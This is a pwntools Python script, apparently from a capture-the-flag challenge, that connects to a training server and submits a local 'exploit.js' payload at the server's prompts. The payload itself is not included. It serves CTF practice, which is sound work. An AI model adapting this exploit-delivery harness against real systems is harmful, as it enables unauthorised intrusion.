#!/usr/bin/env python3
import subprocess, sys, time
from pwn import *

context.log_level = 'info'
HOST = 'xebec.cylabacademy.net'
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 30400


def resolve(host, tries=20):
    for _ in range(tries):
        o = subprocess.run(['getent', 'ahostsv4', host],
                           capture_output=True, text=True).stdout
        for line in o.splitlines():
            if line.split() and '.' in line.split()[0]:
                return line.split()[0]
        time.sleep(2)
    return None


script = open('exploit.js', 'rb').read()
ip = resolve(HOST) or HOST
log.info(f"{HOST}:{PORT} -> {ip}")
p = remote(ip, PORT)
p.recvuntil(b'Provide size. Must be < 5k:')
p.sendline(str(len(script)).encode())
p.recvuntil(b'Provide script please!!')
p.send(script)
data = p.recvall(timeout=40)
print(data.decode(errors='replace'))
